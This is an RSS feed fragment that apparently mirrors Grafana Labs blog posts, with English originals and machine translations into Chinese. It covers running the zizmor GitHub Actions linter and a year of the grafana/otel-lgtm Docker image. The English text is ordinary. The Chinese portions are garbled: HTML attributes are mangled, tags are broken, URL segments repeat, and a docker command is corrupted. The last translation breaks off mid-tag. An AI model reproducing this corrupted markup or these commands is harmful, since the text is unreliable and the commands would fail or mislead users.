1。费率限制&lt;/h3&gt;&#xA;&lt;p&gt;首先，GitHub对存储库和应用程序令牌的速率限制在运行Zizmor可以做的在线检查时会引起一些头痛。这要归功于Zizmor使用GitHub API来获取标签和分支以进行给定动作。当大规模完成此操作时，在大型项目上，您很快就会每小时打15,000个电话。看来维护者已经开始考虑这种用例&#xA;&lt;a href =“ https://github.com/zizmorcore/zizmor/issues/764” target =“ _ blank” rel =“ noopener noreferrer”&gt;此问题&lt;/a&gt;。&lt;/a&gt;。&lt;/p&gt;&#xA;&lt;H3 ID =“ 2-居中的符号 - 构造”&gt; 2。集中规则集配置&lt;/h3&gt;&#xA;&lt;p&gt;我们还遇到了另一个GitHub问题 - 在Github中运行Zizmor作为集中式规则集要求我们提前定义Zizmor配置。我们想将其定义为工作流程旁边的git斑点。但是，我们需要能够使用github &lt;code&gt; id-token：write &lt;/code&gt;权限。在我们的第一方存储库中，这很好。但是，Github正确地将其限制在叉子中运行，这使得难以获得默认配置。我们为此使用的围绕的工作之一是定义&lt;code&gt; .github/zizmor.yml.yml &lt;/code&gt;在存储库中我们得到很多吸引力的文件。如果没有文件，我们也落回内置的Zizmor配置。&lt;/p&gt;&#xA;&lt;H2id =“摘要”&gt;摘要&lt;/h2&gt;&#xA;&lt;p&gt;总而言之，我们喜欢Grafana Labs的Zizmor。它将帮助我们通过相对轻巧的二进制运行来防止攻击。由于在线模式消耗了我们的费率限制，因此我们选择在离线模式下以PRS进行运行。这意味着我们不会从Zizmor提供的所有检查中受益，例如&#xA;&lt;a href =“ https://docs.zizmor.sh/audits/#impostor-commit” target =“ _ blank” rel =“ noopener noreferrer”&gt; imposter-commits &lt;/a&gt;&#xA;&lt;a href =“ https://docs.zizmor.sh/audits/#ref-confusion” target =“ _ blank” rel =“ noopener noreferrer”&gt; ref-confusion &lt;/a&gt;，但这确实意味着我们可以快速运行它，并且我们不会快速达到Github api率限制。&#xA;&lt;p&gt;但是，我们选择了针对一些最受欢迎的存储库（当前是LGTM堆栈存储库）对计划作业进行的额外检查。下次GitHub动作漏洞出现在野外时，我们将为Zizmor做好准备，以检查我们的工作流卫生。&lt;/p&gt;</description>
      <pubDate>Thu, 26 Jun 2025 00:00:00 +0000</pubDate>
    </item>
    <item>
      <title>【Observability in under 5 seconds: Reflecting on a year of grafana/otel-lgtm】在不到5秒内的可观察性：反思G​​rafana/otel-lgtm的一年</title>
      <link>https://grafana.com/blog/2025/07/08/observability-in-under-5-seconds-reflecting-on-a-year-of-grafana/otel-lgtm/</link>
      <description>【&lt;p&gt;With &lt;code&gt;grafana/otel-lgtm&lt;/code&gt;, observability is just one Docker command away.&lt;/p&gt;&#xA;&lt;p&gt;Over the past year,&#xA;&lt;a href=&#34;http://github.com/grafana/docker-otel-lgtm&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;&lt;code&gt;grafana/otel-lgtm&lt;/code&gt;&lt;/a&gt; has simplified observability setups, helping developers get a complete OpenTelemetry stack running in under five seconds. With integrations for metrics, logs, traces, and now profiles via Grafana Pyroscope, it has become a go-to solution for demos, development, and testing, as evidenced by its growing community (1k stars on GitHub and growing!) and notable adopters.&lt;/p&gt;&#xA;&lt;p&gt;In this blog, we&amp;rsquo;ll tell you all you need to know about &lt;code&gt;grafana/otel-lgtm&lt;/code&gt;, from how to get started to what&amp;rsquo;s changed over the past 15 months.&lt;/p&gt;&#xA;&lt;h2 id=&#34;what-is-grafanaotel-lgtm&#34;&gt;What is &lt;code&gt;grafana/otel-lgtm&lt;/code&gt;?&lt;/h2&gt;&#xA;&lt;p&gt;&lt;code&gt;grafana/otel-lgtm&lt;/code&gt; is a Docker image that provides a complete open source OpenTelemetry solution for observability by bundling several key tools:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;a href=&#34;https://opentelemetry.io/docs/collector/&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;OpenTelemetry Collector&lt;/a&gt;: Receives and forwards telemetry signals to observability backends.&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;a href=&#34;https://github.com/prometheus/prometheus&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Prometheus&lt;/a&gt;: Stores and queries your application&amp;rsquo;s metrics (e.g., request rates, error counts, system health).&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;a href=&#34;https://github.com/grafana/loki/&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Grafana Loki&lt;/a&gt;: Stores and queries your application&amp;rsquo;s logs.&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;a href=&#34;https://github.com/grafana/tempo/&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Grafana Tempo&lt;/a&gt;: Stores and queries traces, which show the path of a request as it journeys through your different services.&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;a href=&#34;https://github.com/grafana/pyroscope&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Grafana Pyroscope&lt;/a&gt;: Stores and queries profiles, helping you understand which parts of your code are consuming the most resources (like CPU time or memory).&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;a href=&#34;https://github.com/grafana/grafana&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Grafana&lt;/a&gt;: Visualizes all this data in dashboards, allowing you to see metrics, logs, traces, and profiles in one place.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&#xA;class=&#34;figure-wrapper figure-wrapper__lightbox w-100p &#34;&#xA;style=&#34;max-width: 1999px;&#34;&#xA;itemprop=&#34;associatedMedia&#34;&#xA;itemscope=&#34;&#34;&#xA;itemtype=&#34;http://schema.org/ImageObject&#34;&#xA;&gt;&lt;a&#xA;class=&#34;lightbox-link&#34;&#xA;href=&#34;/media/blog/grafana-otel-lgtm/grafana-otel-lgtm-diagram.png&#34;&#xA;itemprop=&#34;contentUrl&#34;&#xA;&gt;&lt;div class=&#34;img-wrapper w-100p h-auto&#34;&gt;&lt;img&#xA;class=&#34;lazyload &#34;&#xA;data-src=&#34;/media/blog/grafana-otel-lgtm/grafana-otel-lgtm-diagram.png&#34;data-srcset=&#34;/media/blog/grafana-otel-lgtm/grafana-otel-lgtm-diagram.png?w=320 320w, /media/blog/grafana-otel-lgtm/grafana-otel-lgtm-diagram.png?w=550 550w, /media/blog/grafana-otel-lgtm/grafana-otel-lgtm-diagram.png?w=750 750w, /media/blog/grafana-otel-lgtm/grafana-otel-lgtm-diagram.png?w=900 900w, /media/blog/grafana-otel-lgtm/grafana-otel-lgtm-diagram.png?w=1040 1040w, /media/blog/grafana-otel-lgtm/grafana-otel-lgtm-diagram.png?w=1240 1240w, /media/blog/grafana-otel-lgtm/grafana-otel-lgtm-diagram.png?w=1920 1920w&#34;&#xA;data-sizes=&#34;auto&#34;alt=&#34;grafana/otel-lgtm architectural diagram&#34;width=&#34;1999&#34;height=&#34;980&#34;/&gt;&#xA;&lt;noscript&gt;&#xA;&lt;img&#xA;src=&#34;/media/blog/grafana-otel-lgtm/grafana-otel-lgtm-diagram.png&#34;&#xA;alt=&#34;grafana/otel-lgtm architectural diagram&#34;width=&#34;1999&#34;height=&#34;980&#34;/&gt;&#xA;&lt;/noscript&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&#xA;&lt;h2 id=&#34;quickstart&#34;&gt;Quickstart&lt;/h2&gt;&#xA;&lt;p&gt;Getting started is easy. The OpenTelemetry Collector receives signals on ports 4317 (gRPC) and 4318 (HTTP). It then forwards:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Metrics to Prometheus&lt;/li&gt;&#xA;&lt;li&gt;Logs to Loki&lt;/li&gt;&#xA;&lt;li&gt;Traces to Tempo&lt;/li&gt;&#xA;&lt;li&gt;Profiles to Pyroscope&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Grafana is pre-configured with these four data sources and exposes its Web UI on port 3000. Just follow these steps:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Run the following command to start the stack:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;code&gt;docker run --name lgtm -p 3000:3000 -p 4317:4317 -p 4318:4318 --rm -ti grafana/otel-lgtm&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Wait for the log message &lt;code&gt;The OpenTelemetry collector and the Grafana LGTM stack are up and running.&lt;/code&gt; or for the &lt;code&gt;/tmp/ready&lt;/code&gt; file to appear, which will appear in a couple of seconds.&lt;/li&gt;&#xA;&lt;li&gt;Start your&#xA;&lt;a href=&#34;https://opentelemetry.io/docs/zero-code/&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;OpenTelemetry-exporting application&lt;/a&gt;. Example applications are available in the&#xA;&lt;a href=&#34;https://github.com/grafana/docker-otel-lgtm/tree/main/examples&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;repository&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Open&#xA;&lt;a href=&#34;http://localhost:3000/&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;http://localhost:3000/&lt;/a&gt; in your browser to view metrics, logs, traces, and profiles.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;You can read more about using grafana/otel-lgtm in the&#xA;&lt;a href=&#34;/blog/2024/03/13/an-opentelemetry-backend-in-a-docker-image-introducing-grafana/otel-lgtm/&#34;&gt;announcement blog post&lt;/a&gt; from last year.&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;The &lt;code&gt;grafana/otel-lgtm&lt;/code&gt; Docker image is for development, demo, and testing. For production, refer to&#xA;&lt;a href=&#34;/products/cloud/application-observability/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Grafana Cloud Application Observability&lt;/a&gt;.&lt;/p&gt;&lt;/blockquote&gt;&#xA;&lt;h2 id=&#34;one-year-later&#34;&gt;One year later&lt;/h2&gt;&#xA;&lt;p&gt;&lt;code&gt;grafana/otel-lgtm&lt;/code&gt; has made it easier for projects to create a demo setup for observability. Some notable adopters include:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;a href=&#34;https://docs.deno.com/runtime/fundamentals/open_telemetry/&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Deno&lt;/a&gt; (JavaScript)&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;a href=&#34;https://quarkus.io/guides/observability-devservices-lgtm&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Quarkus&lt;/a&gt; (Java, features programmatic end-to-end tests)&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;a href=&#34;https://github.com/softwaremill/bootzooka/blob/d4241fd705a287d5b7504b86b744176e26089fbf/docker-compose.yml#L31&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Bootzooka&lt;/a&gt; (Scala)&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;a href=&#34;https://github.com/roadster-rs/roadster/blob/main/book/src/features/observability/otel.md#grafana&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Roadster&lt;/a&gt; (Rust)&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;a href=&#34;https://github.com/embrace-io/react-otel-sample/blob/main/backend/grafana.Dockerfile&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Embrace Observability&lt;/a&gt; (Kotlin)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Even a&#xA;&lt;a href=&#34;https://csfoundations.cs.aalto.fi/en/courses/designing-and-building-scalable-web-applications/part-6/3-lgtm-stack&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;free course from Aalto University&lt;/a&gt; includes lessons on the LGTM stack.&lt;/p&gt;&#xA;&lt;p&gt;A big thank you to the community for contributions like:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;a href=&#34;https://github.com/grafana/docker-otel-lgtm/pull/284&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Node.js example&lt;/a&gt; by&#xA;&lt;a href=&#34;https://github.com/GhassenRjab&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;@GhassenRjab&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;a href=&#34;https://github.com/grafana/docker-otel-lgtm/pull/275&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;PowerShell support&lt;/a&gt; by&#xA;&lt;a href=&#34;https://github.com/tebeco&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;@tebeco&lt;/a&gt; &lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;a href=&#34;https://github.com/grafana/docker-otel-lgtm/pull/160&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Publishing on GitHub Registry &lt;/a&gt;&#xA;&lt;a href=&#34;https://github.com/Rajpratik71&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;@Rajpratik71&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;… and every one of the&#xA;&lt;a href=&#34;https://github.com/grafana/docker-otel-lgtm/graphs/contributors&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;34 contributors&lt;/a&gt;&#xA;&lt;a href=&#34;https://github.com/grafana/docker-otel-lgtm/pull/160&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt; &lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;The fast startup time is not just great for demonstration and manual troubleshooting—but also for automated testing. Therefore, we created&#xA;&lt;a href=&#34;https://github.com/grafana/oats&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt; OATs&lt;/a&gt;, a no-code test framework based on grafana/otel-lgtm to test your application using YAML. For example:&lt;/p&gt;&#xA;&lt;div class=&#34;code-snippet code-snippet__mini&#34;&gt;&lt;div class=&#34;lang-toolbar__mini&#34;&gt;&#xA;&lt;span class=&#34;code-clipboard&#34;&gt;&#xA;&lt;button x-data=&#34;app_code_snippet()&#34; x-init=&#34;init()&#34; @click=&#34;copy()&#34;&gt;&#xA;&lt;img class=&#34;code-clipboard__icon&#34; src=&#34;/media/images/icons/icon-copy-small-2.svg&#34; alt=&#34;Copy code to clipboard&#34; width=&#34;14&#34; height=&#34;13&#34;&gt;&#xA;&lt;span&gt;Copy&lt;/span&gt;&#xA;&lt;/button&gt;&#xA;&lt;/span&gt;&#xA;&lt;/div&gt;&lt;div class=&#34;code-snippet code-snippet__border&#34;&gt;&#xA;&lt;pre data-expanded=&#34;false&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;expected:&#xA;traces:&#xA;- traceql: &amp;#39;{ span.http.route = &amp;#34;/rolldice/{player?}&amp;#34; }&amp;#39;&#xA;spans:&#xA;- name: &amp;#34;GET /rolldice/{player?}&amp;#34;&#xA;attributes:&#xA;otel.library.name: Microsoft.AspNetCore&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;/div&gt;&#xA;&lt;/div&gt;&lt;/blockquote&gt;&#xA;&lt;h2 id=&#34;whats-new&#34;&gt;What’s new&lt;/h2&gt;&#xA;&lt;p&gt;We&amp;rsquo;re currently up to version 0.11.5, and we&amp;rsquo;ve worked hard to incorporate multiple improvements to &lt;code&gt;grafana/otel-lgtm&lt;/code&gt;. Here are just some of the changes we&amp;rsquo;ve made since the&#xA;&lt;a href=&#34;/blog/2024/03/13/an-opentelemetry-backend-in-a-docker-image-introducing-grafana/otel-lgtm/&#34;&gt;initial release in March 2024&lt;/a&gt;.&lt;/p&gt;&#xA;&lt;h3 id=&#34;faster-startup-time&#34;&gt;Faster startup time&lt;/h3&gt;&#xA;&lt;p&gt;The most requested feature was faster startup. We reduced the startup time from ~60 seconds to under 5 seconds through these key improvements:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Reducing the Prometheus health check scrape interval from 1 minute to 1 second.&lt;/li&gt;&#xA;&lt;li&gt;Using the&#xA;&lt;a href=&#34;https://github.com/grafana/docker-otel-lgtm/blob/main/docker/otelcol-config.yaml&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;health check extension&lt;/a&gt; for faster readiness detection.&lt;/li&gt;&#xA;&lt;li&gt;Optimizing database configurations for DNS lookups and readiness.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;These changes are optimized for fast startup, not for high scalability.&lt;/p&gt;&#xA;&lt;h3 id=&#34;grafana-pyroscope-integration&#34;&gt;Grafana Pyroscope integration&lt;/h3&gt;&#xA;&lt;p&gt;Profiling is the&#xA;&lt;a href=&#34;https://opentelemetry.io/blog/2024/state-profiling/&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;latest OpenTelemetry signal&lt;/a&gt;, and we’ve added&#xA;&lt;a href=&#34;https://github.com/grafana/pyroscope&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Grafana Pyroscope&lt;/a&gt; as the fourth database. Profiling helps you understand which parts of your code are consuming the most resources (like CPU time or memory). This is crucial for identifying performance bottlenecks and optimizing your application. This allows you to seamlessly blend traces and profiles to optimize your critical paths.&lt;/p&gt;&#xA;&lt;figure&#xA;class=&#34;figure-wrapper figure-wrapper__lightbox w-100p &#34;&#xA;style=&#34;max-width: 1999px;&#34;&#xA;itemprop=&#34;associatedMedia&#34;&#xA;itemscope=&#34;&#34;&#xA;itemtype=&#34;http://schema.org/ImageObject&#34;&#xA;&gt;&lt;a&#xA;class=&#34;lightbox-link&#34;&#xA;href=&#34;/media/blog/grafana-otel-lgtm/pyroscope-flame-graph.png&#34;&#xA;itemprop=&#34;contentUrl&#34;&#xA;&gt;&lt;div class=&#34;img-wrapper w-100p h-auto&#34;&gt;&lt;img&#xA;class=&#34;lazyload &#34;&#xA;data-src=&#34;/media/blog/grafana-otel-lgtm/pyroscope-flame-graph.png&#34;data-srcset=&#34;/media/blog/grafana-otel-lgtm/pyroscope-flame-graph.png?w=320 320w, /media/blog/grafana-otel-lgtm/pyroscope-flame-graph.png?w=550 550w, /media/blog/grafana-otel-lgtm/pyroscope-flame-graph.png?w=750 750w, /media/blog/grafana-otel-lgtm/pyroscope-flame-graph.png?w=900 900w, /media/blog/grafana-otel-lgtm/pyroscope-flame-graph.png?w=1040 1040w, /media/blog/grafana-otel-lgtm/pyroscope-flame-graph.png?w=1240 1240w, /media/blog/grafana-otel-lgtm/pyroscope-flame-graph.png?w=1920 1920w&#34;&#xA;data-sizes=&#34;auto&#34;alt=&#34;Grafana Pyroscope flame graph&#34;width=&#34;1999&#34;height=&#34;1045&#34;/&gt;&#xA;&lt;noscript&gt;&#xA;&lt;img&#xA;src=&#34;/media/blog/grafana-otel-lgtm/pyroscope-flame-graph.png&#34;&#xA;alt=&#34;Grafana Pyroscope flame graph&#34;width=&#34;1999&#34;height=&#34;1045&#34;/&gt;&#xA;&lt;/noscript&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&#xA;&lt;p&gt;To try the&#xA;&lt;a href=&#34;https://github.com/grafana/docker-otel-lgtm/tree/main/examples/ebpf-profiler&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;eBPF profiler example&lt;/a&gt;:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Change to the example directory: &lt;code&gt;cd examples/ebpf-profiler&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Start the stack: &lt;code&gt;docker compose up --remove-orphans --build&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Open&#xA;&lt;a href=&#34;http://localhost:3000/a/grafana-pyroscope-app/explore&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;Profiles Drilldown&lt;/a&gt; in Grafana.&lt;/li&gt;&#xA;&lt;li&gt;Filter by &lt;code&gt;process_executable_name = rolldice&lt;/code&gt; and explore the flame graph.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;Profiles Drilldown provides an intuitive interface for exploring your profile data to view service performance, optimize processes, and diagnose issues.&#xA;&lt;a href=&#34;/docs/grafana/latest/explore/simplified-exploration/profiles/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Learn more here&lt;/a&gt;.&lt;/p&gt;&lt;/blockquote&gt;&#xA;&lt;p&gt;In the example flame graph above, we can see that “rolldice” takes 1.2 seconds to complete. Of that, 1.15 seconds are spent in the “roll” function, which in turn is caused by the “Since” function from Go standard library. As “Since” is supposed to be fast, it’s a good idea to check out this particular piece of code, which in this case has been made deliberately slow for demonstration purposes. &lt;/p&gt;&#xA;&lt;div class=&#34;code-snippet code-snippet__mini&#34;&gt;&lt;div class=&#34;lang-toolbar__mini&#34;&gt;&#xA;&lt;span class=&#34;code-clipboard&#34;&gt;&#xA;&lt;button x-data=&#34;app_code_snippet()&#34; x-init=&#34;init()&#34; @click=&#34;copy()&#34;&gt;&#xA;&lt;img class=&#34;code-clipboard__icon&#34; src=&#34;/media/images/icons/icon-copy-small-2.svg&#34; alt=&#34;Copy code to clipboard&#34; width=&#34;14&#34; height=&#34;13&#34;&gt;&#xA;&lt;span&gt;Copy&lt;/span&gt;&#xA;&lt;/button&gt;&#xA;&lt;/span&gt;&#xA;&lt;/div&gt;&lt;div class=&#34;code-snippet code-snippet__border&#34;&gt;&#xA;&lt;pre data-expanded=&#34;false&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;start := time.Now()&#xA;for time.Since(start) &amp;lt; 1*time.Second {&#xA;// busy wait&#xA;}&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 id=&#34;get-started-today&#34;&gt;Get started today&lt;/h2&gt;&#xA;&lt;p&gt;Grafana Labs remains dedicated to the OpenTelemetry project, continuously enhancing &lt;code&gt;grafana/otel-lgtm&lt;/code&gt; and other tools to empower users in their observability journey.&lt;/p&gt;&#xA;&lt;p&gt;Try&#xA;&lt;a href=&#34;https://github.com/grafana/docker-otel-lgtm/&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;&lt;code&gt;grafana/docker-otel-lgtm&lt;/code&gt;&lt;/a&gt; today and see for yourself. And if you&amp;rsquo;re looking to help this project grow, feel free to jump in and start contributing today!&lt;/p&gt;&#xA;&lt;p&gt;&lt;em&gt;&#xA;&lt;a href=&#34;/products/cloud/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Grafana Cloud&lt;/a&gt; is the easiest way to get started with metrics, logs, traces, dashboards, and more. We have a generous forever-free tier and plans for every use case.&#xA;&lt;a href=&#34;/auth/sign-up/create-user/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt; Sign up for free now&lt;/a&gt;!&lt;/em&gt;&lt;/p&gt;】&lt;p&gt;使用&lt;P&gt; &lt;code&gt; grafana/otel-lgtm &lt;/code&gt;，可观察性只是一个docker命令。&lt;/p&gt;&#xA;&lt;p&gt;在过去的一年中&#xA;&lt;a href=&#34;http://github.com/grafana/docker-otel-lgtm&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;&lt;code&gt;grafana/otel-lgtm&lt;/code&gt;&lt;/a&gt; has simplified observability setups, helping developers get a complete OpenTelemetry stack running in under five seconds.随着指标，日志，痕迹和现在通过Grafana Pyroscope的集成，它已成为演示，开发和测试的首选解决方案，这是其不断增长的社区（Github上的1K星星和著名的采用者）和著名采用者所证明的。&lt;/p&gt;&gt; &lt;/p&gt;&gt; &lt;/p&gt;&#xA;&lt;p&gt;在此博客中，我们将告诉您有关&lt;code&gt; grafana/otel-lgtm &lt;/code&gt;的所有信息，从如何开始到过去15个月发生的变化。&lt;/p&gt;&#xA;&lt;H2 ID =“ What-is-Grafanaotel-lgtm”&gt;什么是&lt;code&gt; grafana/otel-lgtm &lt;/code&gt;？&lt;/h2&gt;&#xA;&lt;p&gt; &lt;code&gt; grafana/otel-lgtm &lt;/code&gt;是一个docker映像，通过捆绑多个关键工具，提供了一个完整的开源OpenTElemetry解决方案，以可观察到可观察性：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;a href =“ https://opentelemetry.io/docs/collector/” target =“ _ blank” rel =“ noopener noreferrer”&gt; opentelemetry collector &lt;/a&gt;&#xA;&lt;li&gt;&#xA;&lt;a href =“ https://github.com/prometheus/prometheus” target =“ _ blank” rel =“ noopener noreferrer”&gt; prometheus &lt;/a&gt;：存储和查询应用程序的指标（例如，请求率，错误计数，系统健康）。&#xA;&lt;li&gt;&#xA;&lt;a href =“ https://github.com/grafana/loki/” target =“ _ blank” rel =“ noopener noreferrer”&gt; grafana loki &lt;/a&gt;：商店和查询您的应用程序的日志。&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;a href =“ https://github.com/grafana/tempo/” target =“ _ blank” rel =“ noopener noreferrer”&gt; grafana tempo &lt;/a&gt;：商店和查询痕迹，显示出请求的路径。&#xA;&lt;li&gt;&#xA;&lt;a href =“ https://github.com/grafana/pyroscope” target =“ _ black” rel =“ noopener noreferrer”&gt; grafana pyroscope &lt;/a&gt;：商店和查询配置文件，可帮助您了解代码的哪些部分消耗了最多的资源（例如CPU时间或内存）。&#xA;&lt;li&gt;&#xA;&lt;a href =“ https://github.com/grafana/grafana” target =“ _ blank” rel =“ noopener noreferrer”&gt; grafana &lt;/a&gt;：可视化仪表板中的所有这些数据，使您可以看到指标，日志，登录，痕迹和一个位置。&#xA;&lt;/ul&gt;&#xA;&lt;图&#xA;class =“ figup-wrapper figuper-wrapper__lightbox W-100P”&#xA;样式=“最大宽度：1999px;”&#xA;itemprop =“ iSsectedmedia”&#xA;itemScope =“”&#xA;itemType =“ http://schema.org/imageObject”&#xA;&gt; &lt;a&#xA;class =“ Lightbox-link”&#xA;href =“/媒体/博客/grafana-otel-lgtm/grafana-otel-otel-lgtm-diagram.png”&#xA;itemprop =“ contenturl”&#xA;&gt; &lt;div class =“ img-wrapper W-100P H-auto”&gt; &lt;img&#xA;class =“ Lazyload”&#xA;data-src =“/媒体/blog/grafana-otel-lgtm/grafana-otel-lgtm-diagram.png” data-srcset =“/媒体/blog/grafana-otel-lgtm/grafana-otel-lgtm/grafana-otel-otel-otel-otel-lgtm-diagram.png？w = 320 320w，w = 320 320w， /Media/blog/grafana-otel-lgtm/grafana-otel-lgtm-diagram.png?w=550 550W，/media/blog/grafana-otel-otel-otel-lgtm/grafana-tel-lgtm/grafana-otel-lgtm-diagram.png？a-otel-lgtm/grafana-otel-lgtm-diagram.png？w = 900 900W，/media/blog/grafana-otel-tel-lgtm/grafana-otel-otel-otel-lgtm-diagram.png?w=1040w = 1040w， /Media/blog/grafana-otel-lgtm/grafana-otel-lgtm-diagram.png?w=1240 1240W，/media/Blog/grag/grafana-otel-lgtm/grafana-grafana-grafana-otel-otel-lgtm-lgtm-diagram.png of&#xA;data-sizes =“ auto” alt =“ grafana/otel-lgtm架构图” width =“ 1999”高度=“ 980”/&gt;&#xA;&lt;NoScript&gt;&#xA;&lt;img&#xA;src =“/媒体/博客/grafana-otel-lgtm/grafana-otel-otel-lgtm-diagram.png”&#xA;alt =“ grafana/otel-lgtm架构图” width =“ 1999”高度=“ 980”/&gt;&#xA;&lt;/noscript&gt; &lt;/div&gt; &lt;/a&gt; &lt;/figie&gt;&#xA;&lt;H2 ID =“ QuickStart”&gt; QuickStart &lt;/h2&gt;&#xA;&lt;p&gt;入门很容易。 OpentElemetry集合器在端口4317（GRPC）和4318（HTTP）上接收信号。然后转发：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;普罗米修斯的指标&lt;/li&gt;&#xA;&lt;li&gt;记录到Loki &lt;/li&gt;&#xA;&lt;li&gt;跟踪速度&lt;/li&gt;&#xA;&lt;li&gt;拟式载焦&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt; Grafana与这四个数据源预先配置，并在端口3000上公开其Web UI。只需按照以下步骤：&lt;/p&gt;：&#xA;&lt;ol&gt;&#xA;&lt;li&gt;运行以下命令启动堆栈：&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt; &lt;code&gt; docker run -name lgtm -p 3000：3000 -p 4317：4317 -p 4318：4318 -rm -ti grafana/otel -lgtm &lt;/code&gt; &lt;/code&gt; &lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;等待日志消息&lt;code&gt; OpentElemetry Collector和Grafana LGTM堆栈正在启动并运行。&lt;/code&gt;或&lt;code&gt;/tmp/tmp/ready &lt;/code&gt;要出现的文件，将在几秒钟内出现。&lt;/li&gt;&#xA;&lt;li&gt;开始您的&#xA;&lt;a href =“ https://opentelemetry.io/docs/zero-code/” target =“ _ blank” rel =“ noopener noreferrer”&gt; opentElemetry-exportry-exporting应用程序&lt;/a&gt;。示例应用程序可在&#xA;&lt;a href =“ https://github.com/grafana/docker-otel-otel-lgtm/tree/main/main/examples” target =“ _ blank” rel =“ noopener noreferrer”&gt; repository &lt;/a&gt;。&lt;/li&gt;。&lt;/li&gt;&#xA;&lt;li&gt;打开&#xA;&lt;a href =“ http：// localhost：3000/” target =“ _ blank” rel =“ noopener 